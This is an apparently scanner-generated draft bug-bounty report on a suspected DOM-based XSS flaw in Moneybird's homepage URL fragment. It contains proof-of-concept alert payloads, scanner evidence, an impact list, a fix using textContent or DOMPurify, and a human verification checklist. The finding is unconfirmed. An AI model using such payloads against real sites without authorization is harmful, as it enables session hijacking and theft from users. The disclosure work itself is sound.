# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** High | **CVSS:** 7.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Platform:** HackerOne | **Program:** Moneybird
**Status:** ⚠️ NEEDS HUMAN BROWSER VERIFICATION before submit
**Scanner confidence:** medium (AI promoted to high — treat with caution)
**CWE:** CWE-79 (Cross-site Scripting), CWE-116 (Improper Encoding / Escaping)
**OWASP:** A03:2021 — Injection

---

## Summary

The Moneybird homepage (`www.moneybird.com/`) appears to write URL fragment content
into the DOM via `innerHTML` without sanitization. An attacker can craft a malicious link
that causes arbitrary JavaScript to execute in the victim's browser — with no server-side
interaction required, since URL fragments are processed entirely client-side.

---

## Reproduction Steps

> **Important:** DOM-based XSS is triggered in the browser, not via HTTP request.
> The curl command below only fetches the page HTML; it cannot trigger client-side JS.
> **You must open the URL below in a real browser (Chrome / Firefox) to verify.**

1. Open the following URL in a browser (paste directly into the address bar):

   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```

2. If an alert dialog appears showing `moneybird.com`, the XSS is confirmed.

3. The scanner observed the payload reaching **2 separate `innerHTML` sinks** on the page,
   which suggests the fragment is processed in multiple code paths.

**Alternative payload (if angle brackets are encoded by browser):**

```
https://www.moneybird.com/#%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

---

## Scanner Evidence

```
Detection method : dom-sink (Playwright)
Payload          : #<img src=x onerror=alert("secbot-xss-37")>
Sinks triggered  : innerHTML-set, innerHTML-set (2 occurrences)
Test URL         : https://www.moneybird.com/#<img src=x onerror=alert("secbot-xss-37")>
```

> **Fetch the page HTML for reference (curl cannot trigger JS):**
> ```bash
> curl -sL 'https://www.moneybird.com/' | grep -i 'location.hash\|fragment\|innerHTML'
> ```
> If the page source contains `location.hash` or `window.location.hash` assigned to innerHTML,
> that confirms the code path the scanner identified.

---

## Impact

If confirmed, an attacker can:
- Steal session cookies (if `HttpOnly` is not set on auth cookies)
- Perform authenticated actions on behalf of the victim in the Moneybird accounting app
- Redirect to phishing pages impersonating Moneybird
- Exfiltrate sensitive financial data visible in the authenticated UI

This is particularly impactful for an accounting SaaS: victims include accountants and business
owners whose Moneybird session could be hijacked by clicking a malicious link (e.g., sent via
email or shared as a "Moneybird invoice link").

---

## Suggested Fix

Never assign unsanitized URL fragment content to `innerHTML`. Options:

```javascript
// VULNERABLE
document.getElementById('target').innerHTML = window.location.hash.slice(1);

// SAFE — plain text only
document.getElementById('target').textContent = window.location.hash.slice(1);

// SAFE — if HTML rendering is genuinely required
import DOMPurify from 'dompurify';
document.getElementById('target').innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Audit all code paths that read from `window.location.hash` and ensure they use `textContent`
or a sanitizer before any DOM insertion.

---

## Scope Note

`www.moneybird.com` is covered by `moneybird.com` in the Moneybird HackerOne scope.
Confirm the H1 policy includes the marketing site (not just `app.moneybird.com`) before submitting.

---

## Verification Checklist (for Dio before submitting)

- [ ] Visited `https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>` in browser
- [ ] Alert dialog appeared with `www.moneybird.com`
- [ ] Verified `www.moneybird.com` is explicitly in scope on H1 program page
- [ ] Checked if any browser extension / ad blocker could have interfered with the test
- [ ] Tested in a clean browser profile (no extensions)
